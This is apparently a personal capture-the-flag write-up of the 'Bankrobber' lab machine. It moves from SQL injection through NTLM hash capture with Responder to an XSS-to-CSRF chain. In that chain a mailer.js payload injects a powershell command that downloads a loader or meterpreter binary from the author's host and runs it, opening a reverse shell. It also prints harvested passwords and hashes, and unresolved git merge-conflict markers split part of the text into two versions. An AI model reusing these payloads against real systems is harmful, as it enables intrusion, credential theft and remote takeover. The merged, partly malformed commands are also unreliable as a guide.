# Bankrobber

- Difficulty: "Insane"
- Platform: Windows
---

10.10.10.154

## Nmap
```
I wiped out disk without backing up notes like an idiot... 
picking up from web-admin access

The Rundown:

Esentially, there is a database user search and and E-Coin transfer service. 
The transfer service is manually reviewed by an administrator. 

The filed inputs do not validate/sanitize.
A cross-site scripting attack is possible, although finicky, returning the administrators cookie within the response headers.

There seems to be SQL-Injection present in the user database lookup, although I have yet to go any further. 
I am conflating both these things together and I forget what I actually did ut oh well... continuing.
```

```bash

➜  Bankrobber git:(main) 
	sudo nmap -oA nmap/found-TCP-detailed 
	-p$(cat nmap/allports-TCP-initial.nmap | grep open | awk '{ print $1 }' | awk '{ print $0+0}' | sed ':a;N;$!ba;s/\n/,/g') 
	-sCV -T4 --min-rate 5000 -Pn 10.10.10.154
 
Starting Nmap 7.94 ( https://nmap.org ) at 2023-07-30 02:53 EDT
Stats: 0:00:40 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 99.82% done; ETC: 02:54 (0:00:00 remaining)
Nmap scan report for 10.10.10.154
Host is up (0.027s latency).

PORT     STATE SERVICE      VERSION
80/tcp   open  http         Apache httpd 2.4.39 ((Win64) OpenSSL/1.1.1b PHP/7.3.4)
|_http-server-header: Apache/2.4.39 (Win64) OpenSSL/1.1.1b PHP/7.3.4
|_http-title: E-coin
443/tcp  open  ssl/http     Apache httpd 2.4.39 ((Win64) OpenSSL/1.1.1b PHP/7.3.4)
| tls-alpn: 
|_  http/1.1
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=localhost
| Not valid before: 2009-11-10T23:48:47
|_Not valid after:  2019-11-08T23:48:47
|_http-server-header: Apache/2.4.39 (Win64) OpenSSL/1.1.1b PHP/7.3.4
|_http-title: E-coin
445/tcp  open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
3306/tcp open  mysql        MariaDB (unauthorized)
Service Info: Host: BANKROBBER; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-time: 
|   date: 2023-07-30T06:54:01
|_  start_date: 2023-07-30T05:18:55

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 53.85 seconds
```

`admin:Hopelessromantic`

A regular union select statement reveals version `MariaDB-10.1.38` in field 2:
```http
POST /admin/search.php HTTP/1.1
Host: 10.10.10.154
Content-Length: 37
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.5790.110 Safari/537.36
Content-type: application/x-www-form-urlencoded
Accept: */*
Origin: http://10.10.10.154
Referer: http://10.10.10.154/admin/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: id=1; username=YWRtaW4%3D; password=SG9wZWxlc3Nyb21hbnRpYw%3D%3D
Connection: close

term=1'union+select+1,@@version,3-- -
```

```
this returns user: `root@localhost`

lucky guess:
term=1'union slect user,password,3 from mysql.user--

this returns hash: *F435725A173757E57BD36B09048B8B610FF4D0C4
```

SHA-1 hash decodes to `Welkom1!`. This could be either admin or gio's password. 
Connections aren't permitted to the MySQL service from an external IP. Localhost only:
```bash
➜  loot git:(main) ✗ mysql -u 'gio' -p 'Welkom1!' -h 10.10.10.154
mysql: Deprecated program name. It will be removed in a future release, use '/usr/bin/mariadb' instead
Enter password: 

ERROR 1130 (HY000): Host '10.10.14.2' is not allowed to connect to this MariaDB server
```

This password does not work on SMB. 

## NTLM Theft from Insecure load_file in MySQL
A possibility would be to capture an NTLM hash since SQLI is present.

Resources: 
- https://book.hacktricks.xyz/windows-hardening/ntlm/places-to-steal-ntlm-creds
- https://osandamalith.com/2017/02/03/mysql-out-of-band-hacking/

Querying `term=1'union select @@secure_file_priv,2,3;-- -` outputs nothing in field 1, (I don't have any screencaps).
This indicates that the secure file privilege parameter is not effective. 

I tried the example by osanda but it seemed to not work in this case. Trying to read a file into "dumpfile" did not seem to work for me.
Checking 0xdf's write-up of this box I found that he uses a similar method, however much simpler:
```
" I also successfully got a NetNTLMv2 hash for the user (just like in Giddy and Querier by starting `responder` and submitting 
`term=10' UNION SELECT 1,load_file('\\\\10.10.14.5\\test'),3-- - " he states.
```

Querying `term=1'union select load_file('\\\\10.10.14.2\\test'),2,3;-- -`
```

➜  ~ sudo responder -I tun0
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

           NBT-NS, LLMNR & MDNS Responder 3.1.3.0

  To support this project:
  Patreon -> https://www.patreon.com/PythonResponder
  Paypal  -> https://paypal.me/PythonResponder

  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
  To kill this script hit CTRL-C
  
[+] Listening for events...

[*] [LLMNR]  Poisoned answer sent to 10.10.14.2 for name archlinux
[*] [LLMNR]  Poisoned answer sent to 10.10.14.2 for name archlinux
[*] [LLMNR]  Poisoned answer sent to fe80::3286:2d63:b66c:2ba2 for name archlinux
[*] [LLMNR]  Poisoned answer sent to 10.10.14.2 for name archlinux
[*] [LLMNR]  Poisoned answer sent to fe80::3286:2d63:b66c:2ba2 for name archlinux
[*] [LLMNR]  Poisoned answer sent to fe80::3286:2d63:b66c:2ba2 for name archlinux
[SMB] NTLMv2-SSP Client   : 10.10.10.154
[SMB] NTLMv2-SSP Username : BANKROBBER\Cortin
[SMB] NTLMv2-SSP Hash     : Cortin::BANKROBBER:e77408bc427cbc60:61607960ABEA68B1737992BF460FF670:010100000000000000865F6D96C2D901D79B3453124449620000000002000800520059003200590001001E00570049004E002D0053004D004D0036004D0050004D00390050004100340004003400570049004E002D0053004D004D0036004D0050004D0039005000410034002E0052005900320059002E004C004F00430041004C000300140052005900320059002E004C004F00430041004C000500140052005900320059002E004C004F00430041004C000700080000865F6D96C2D901060004000200000008003000300000000000000000000000002000003E4CAE96D9B7A0B88500929A65CACF3540353FCDED9B6C48C1B073BD950446B00A0010000000000000000000000000000000000009001E0063006900660073002F00310030002E00310030002E00310034002E003200000000000000000000000000

```

I don't know why this worked and Osanda's did not. Obviously it uses a system command to reach out to a server similar to `net use \\IP\.` Trying to get the SQL version number into a dumpfile did not seem to catch. I will have to continue reading about it. 

Also, this hash does not seem crackable, taking note that we have another user named `Cortin.`

## XAMPP?
I recall seeing a XAMPP error page at some point. There could be a possibility of arbitrary file read if I can figure out where the XAMPP files are stored.
Source code to the Backdoor Checker would be a huge benefit.

Reading files with MySQL: https://www.w3resource.com/mysql/string-functions/mysql-load_file-function.php

I tried to read the hosts file but this does not seem to work. It might be possible to read user.txt from Cortin's home directory.
```http
Request:
POST /admin/search.php HTTP/1.1
Host: 10.10.10.154
Content-Length: 78
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.5790.110 Safari/537.36
Content-type: application/x-www-form-urlencoded
Accept: */*
Origin: http://10.10.10.154
Referer: http://10.10.10.154/admin/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: id=1; username=YWRtaW4%3D; password=SG9wZWxlc3Nyb21hbnRpYw%3D%3D
Connection: close

term=1'union select load_file('C:\\Users\\Cortin\\Desktop\\user.txt'),2,3;-- -


Response:
HTTP/1.1 200 OK
Date: Sun, 30 Jul 2023 08:54:00 GMT
Server: Apache/2.4.39 (Win64) OpenSSL/1.1.1b PHP/7.3.4
X-Powered-By: PHP/7.3.4
Content-Length: 203
Connection: close
Content-Type: text/html; charset=UTF-8

<table width='90%'><tr><th>ID</th><th>User</th></tr>
		<tr>
		    <td>1</td>
		    <td>admin</td>
		 </tr>
		
		<tr>
		    <td>c4c8de4162aa03152f52aecc122e6c1f
</td>
		    <td>2</td>
		 </tr>
		</table>
```

With this kind of file read, it could be possible to fuzz for common file names. However, this wouldn't make sense in this context. I want the source code for any XAMPP php scripts.

From the Apache version in the response, it seems like the XAMPP version is `XAMPP release 7.1.28 , 7.2.17 or 7.3.4:` I'll need to find some source for the XAMPP directory tree and try to enumerate where I can find these custom php scripts used on the site.

- https://www.simplilearn.com/tutorials/php-tutorial/php-using-xampp
```
## How to Start a New PHP Project in XAMPP?

- Before you run or start writing any program in PHP, you should start Apache and MYSQL. 
- After starting both servers, you have to write a program in Notepad. 
- After writing it, save that file as "program.php". 
- Then copy that file program.php to C:/Program Files/XAMPP/htdocs.
- Open the browser and type [http://localhost](http://localhost/).
- Now run your code in that browser.
```

- https://github.com/xampp-phoenix/xampp
```http
C:\xampp\readme_en.txt

HTTP/1.1 200 OK
Date: Sun, 30 Jul 2023 09:11:03 GMT
Server: Apache/2.4.39 (Win64) OpenSSL/1.1.1b PHP/7.3.4
X-Powered-By: PHP/7.3.4
Content-Length: 7535
Connection: close
Content-Type: text/html; charset=UTF-8

<table width='90%'><tr><th>ID</th><th>User</th></tr>
		<tr>
		    <td>1</td>
		    <td>admin</td>
		 </tr>
		
		<tr>
		    <td>###### ApacheFriends XAMPP Version 7.3.4 ######

Important! PHP in this package needs the Microsoft Visual C++ 2015 Redistributable package from
http://www.microsoft.com/en-us/download/. Please ensure that the VC++ 2015 runtime
libraries are installed on your system.

  + Apache 2.4.39
  + MariaDB 10.1.38
  + PHP 7.3.4 (VC15 X86 64bit thread safe) + PEAR
  + phpMyAdmin 4.8.5
  + OpenSSL 1.1.0g
  + ADOdb 518a
  + Mercury Mail Transport System v4.63 (not included in the portable version)
  + FileZilla FTP Server 0.9.41 (not included in the portable version)
  + Webalizer 2.23-04 (not included in the portable version)
  + Strawberry Perl 5.16.3.1 Portable
  + Tomcat 7.0.92
  + XAMPP Control Panel Version 3.2.3.
  + XAMPP mailToDisk 1.0 (write emails via PHP on local disk in <xampp>\mailoutput. Activated in the php.ini as mail default.)

---------------------------------------------------------------

* System Requirements:

  + 64 MB RAM (RECOMMENDED)
  + 750 MB free fixed disk
  + Windows 7, Windows 8, Windows 10
```

There is some conflict between what the two articles claim is the proper directory for custom php scripts. However, with a bit of playing around and reading the XAMPP Github it's pretty clear that the custom scripts are likely within `C:\xampp\htdocs.` I was able to grab the homepage's source code.

```
HTTP/1.1 200 OK
Date: Sun, 30 Jul 2023 09:18:30 GMT
Server: Apache/2.4.39 (Win64) OpenSSL/1.1.1b PHP/7.3.4
X-Powered-By: PHP/7.3.4
Connection: close
Content-Type: text/html; charset=UTF-8
Content-Length: 8781

<...SNIP...>

					<p class="text-white pt-20 pb-20">
							E-coin is adecentralized platform that runs smart contracts: applications that run exactly as programmed without 
							any possibility of downtime, censorship, fraud or third-party interference.
						</p>
						<a href="#" class="primary-btn header-btn text-uppercase">Buy E-coin</a>

<...SNIP...>
```

Since I lost all my notes previously, including directory fuzzing and nmap scans, I simply looked at a writeup for all the available paths for the E-Coin website :^) (because I'm lazy and I hate waiting for scans to finish... fuck it).  The `/admin/` directory contains the source for `backdoorchecker.php:`

#### backdoorchecker.php
```php
<tr>
	<td><?php
		include('../link.php');
		include('auth.php');

		$username = base64_decode(urldecode($_COOKIE['username']));
		$password = base64_decode(urldecode($_COOKIE['password']));
		$bad 	  = array('$(','&');
		$good 	  = "ls";

		if(strtolower(substr(PHP_OS,0,3)) == "win"){
			$good = "dir";
		}

		if($username == "admin" && $password == "Hopelessromantic"){
			if(isset($_POST['cmd'])){
					// FILTER ESCAPE CHARS
					foreach($bad as $char){
						if(strpos($_POST['cmd'],$char) !== false){
							die("You're not allowed to do that.");
						}
					}
					// CHECK IF THE FIRST 2 CHARS ARE LS
					if(substr($_POST['cmd'], 0,strlen($good)) != $good){
						die("It's only allowed to use the $good command");
					}

					if($_SERVER['REMOTE_ADDR'] == "::1"){
						system($_POST['cmd']);
					} else{
						echo "It's only allowed to access this function from localhost (::1).<br> This is due to the recent hack attempts on our server.";
					}
			}
		} else{
			echo "You are not allowed to use this function!";
		}
		?></td>
	<td>2</td>
</tr>
```

#### link.php
```php
<?php
	$user = 'root';
	$pass = 'Welkom1!';
	$dsn = "mysql:host=127.0.0.1;dbname=bankrobber;";

	$pdo = new PDO($dsn,$user,$pass);

	function echoBalance($pdo){
		$pdo = $pdo;
		if(isset($_COOKIE['id'])){
			$stmt = $pdo->prepare("SELECT amount FROM balance where userId = ?");
			$stmt->execute([$_COOKIE['id']]);

			while($row = $stmt->fetch()){
				return $row[0];
			}
		}
	}
?>
```

It's pretty obvious that the One thing that stands out is with the $_SERVER environment check in `backdoorchecker.php`, where it looks for a localhost ip address. I honestly have no idea how this could be done.

#### The following day...
Cross site request forgery... Yes, I had a hint. The XSS we had earlier could potentially be used to "bounce a request back" (I don't know if my analogy makes sense) to the admin's localhost, from himself, executing our own commands within a payload. There's no cross-origin policy or CSRF-Token implemented so it's possible.

<<<<<<< HEAD
Once bankrobber-server reaches back to my server for the javascript, it should execute any command.  This one was a bit challenging. I had never done CSRF before and needed to figure out how exactly sending the commands would work. 
- https://portswigger.net/web-security/csrf

I'm hoping that this will be a Windows 10 machine so that I can use my custom loader. If not, I'll just have to use a regular meterpreter for now.

#### From portswigger.com
```
Note that some simple CSRF exploits employ the GET method and can be fully self-contained with a single URL on the vulnerable web site. In this situation, the attacker may not need to employ an external site, and can directly feed victims a malicious URL on the vulnerable domain. In the preceding example, if the request to change email address can be performed with the GET method, then a self-contained attack would look like this:

`<img src="https://vulnerable-website.com/email/change?email=pwned@evil-user.net">`
```
```js
var request = XMLHttpRequest();
request.open("POST", "http://localhost/admin/backdoorchecker.php", true);
```

I already know this part however I need to find a way to insert a command with it. Considering `cmd=` will be checked I have to do some searching around. How can I insert extra commands into `mailer.js?`

XSS Request:
```http
POST /user/transfer.php HTTP/1.1
Host: 10.10.10.154
Content-Length: 39
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.5790.110 Safari/537.36
Content-type: application/x-www-form-urlencoded
Accept: */*
Origin: http://10.10.10.154
Referer: http://10.10.10.154/user/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: id=3; username=bGVtdXI%3D; password=cGFzc3dvcmQ%3D
Connection: close

fromId=3&toId=3&amount=100&comment=<img src="http://10.10.14.2/nothing.jpg"/><script src="http://10.10.14.2/javascript/mailer.js"></script>
```

Example from Backdoorchecker:
```http
POST /admin/backdoorchecker.php HTTP/1.1
Host: 10.10.10.154
Content-Length: 7
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.5790.110 Safari/537.36
Content-type: application/x-www-form-urlencoded
Accept: */*
Origin: http://10.10.10.154
Referer: http://10.10.10.154/admin/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: id=1; username=YWRtaW4%3D; password=SG9wZWxlc3Nyb21hbnRpYw%3D%3D
Connection: close

cmd=dir
```


mailer.js:
```js
var request = new XMLHttpRequest();
var params = 'cmd=dir|powershell -c "iwr -uri http://10.10.14.2:8000/hexane_loader2.exe -outfile C:%temp%\\hexane.exe; %temp%\\hexane.exe';
request.open("POST", "http://localhost/admin/backdoorchecker.php", true);
request.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
request.send(params);

```
=======
```js
var request = XMLHttpRequest();
var params = 'cmd=dir|powershell -c http://10.10.14.2:8000/x64-meterpreter.exe -outfile %temp%/meter.exe; cmd.exe /c %temp%/meter.exe';

request.open('POST', 'http://localhost/admin/backdoorchecker.php', true);
request.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
request.send(params);
```

Using a bitwise OR will basically try to run both commands in PHP and we send the XSS to the admin (again):
```js
<script src='http://10.10.14.2/mailer.js'></script>
```
```http
➜  www git:(main) ✗ sudo python3 -m http.server 80
[sudo] password for lemur:
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.10.154 - - [01/Aug/2023 23:58:07] "GET /mailer.js HTTP/1.1" 200 -
10.10.10.154 - - [01/Aug/2023 23:58:32] "GET /mailer.js HTTP/1.1" 200 -
```
```http
➜  payload git:(main) ✗ python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.10.10.154 - - [01/Aug/2023 23:58:07] "GET /x64-meterpreter.exe HTTP/1.1" 200 -
10.10.10.154 - - [01/Aug/2023 23:58:33] "GET /x64-meterpreter.exe HTTP/1.1" 200 -
```

```bash
[*] Started reverse TCP handler on 10.10.14.2:443
[*] Sending stage (200774 bytes) to 10.10.10.154
[*] Meterpreter session 1 opened (10.10.14.2:443 -> 10.10.10.154:49978) at 2023-08-01 23:58:10 -0400

meterpreter > dir
Listing: C:\xampp\htdocs\admin
==============================

Mode              Size   Type  Last modified              Name
----              ----   ----  -------------              ----
100666/rw-rw-rw-  271    fil   2018-12-20 19:49:56 -0500  auth.php
100666/rw-rw-rw-  1001   fil   2019-04-27 10:13:01 -0400  backdoorchecker.php
100666/rw-rw-rw-  567    fil   2018-12-22 06:40:23 -0500  handle.php
100666/rw-rw-rw-  10584  fil   2019-04-27 16:26:06 -0400  index.php
100666/rw-rw-rw-  414    fil   2018-12-22 06:40:27 -0500  search.php
```

## Initial Foothold
```powershell
meterpreter > dir
Listing: C:\Users\Cortin
========================

Mode              Size     Type  Last modified              Name
----              ----     ----  -------------              ----
040777/rwxrwxrwx  0        dir   2019-04-24 11:51:28 -0400  AppData
040777/rwxrwxrwx  0        dir   2019-04-24 11:51:28 -0400  Application Data
040555/r-xr-xr-x  0        dir   2019-04-24 20:58:46 -0400  Contacts
040777/rwxrwxrwx  0        dir   2019-04-24 11:51:28 -0400  Cookies
040555/r-xr-xr-x  0        dir   2019-04-25 16:16:03 -0400  Desktop
040555/r-xr-xr-x  4096     dir   2019-04-24 20:58:46 -0400  Documents
040555/r-xr-xr-x  4096     dir   2019-04-24 21:15:16 -0400  Downloads
040555/r-xr-xr-x  0        dir   2019-04-24 20:58:46 -0400  Favorites
040555/r-xr-xr-x  0        dir   2019-04-24 20:58:47 -0400  Links
040777/rwxrwxrwx  0        dir   2019-04-24 11:51:28 -0400  Local Settings
040777/rwxrwxrwx  0        dir   2019-04-24 11:51:28 -0400  Menu Start
040777/rwxrwxrwx  0        dir   2019-04-24 11:51:28 -0400  Mijn documenten
040555/r-xr-xr-x  0        dir   2019-04-24 20:58:46 -0400  Music
100666/rw-rw-rw-  1048576  fil   2022-10-21 08:11:10 -0400  NTUSER.DAT
100666/rw-rw-rw-  65536    fil   2019-04-24 21:23:54 -0400  NTUSER.DAT{f5b13604-4b48-11e6-80cb-e41d2d012050}.T
                                                            M.blf
100666/rw-rw-rw-  524288   fil   2019-04-24 21:23:54 -0400  NTUSER.DAT{f5b13604-4b48-11e6-80cb-e41d2d012050}.T
                                                            MContainer00000000000000000001.regtrans-ms
100666/rw-rw-rw-  524288   fil   2019-04-24 11:56:37 -0400  NTUSER.DAT{f5b13604-4b48-11e6-80cb-e41d2d012050}.T
                                                            MContainer00000000000000000002.regtrans-ms
040777/rwxrwxrwx  0        dir   2019-04-24 11:51:28 -0400  NetHood
040777/rwxrwxrwx  0        dir   2019-04-24 11:51:28 -0400  Netwerkprinteromgeving
040555/r-xr-xr-x  0        dir   2019-08-16 09:15:02 -0400  OneDrive
040555/r-xr-xr-x  0        dir   2019-04-24 20:58:46 -0400  Pictures
040777/rwxrwxrwx  0        dir   2019-04-24 11:51:28 -0400  Recent
040555/r-xr-xr-x  0        dir   2019-04-24 20:58:47 -0400  Saved Games
040555/r-xr-xr-x  4096     dir   2019-04-24 20:58:46 -0400  Searches
040777/rwxrwxrwx  0        dir   2019-04-24 11:51:28 -0400  SendTo
040777/rwxrwxrwx  0        dir   2019-04-24 11:51:28 -0400  Sjablonen
040555/r-xr-xr-x  0        dir   2019-04-24 20:58:46 -0400  Videos
100666/rw-rw-rw-  307200   fil   2019-04-24 11:51:28 -0400  ntuser.dat.LOG1
100666/rw-rw-rw-  229376   fil   2019-04-24 11:51:28 -0400  ntuser.dat.LOG2
100666/rw-rw-rw-  20       fil   2019-04-24 11:51:28 -0400  ntuser.ini
```

Some of these names are in a different language.  It's written in Dutch, according to Google.

>>>>>>> 2e0c511f5fe68e03468643fcc7630df63aa068b7
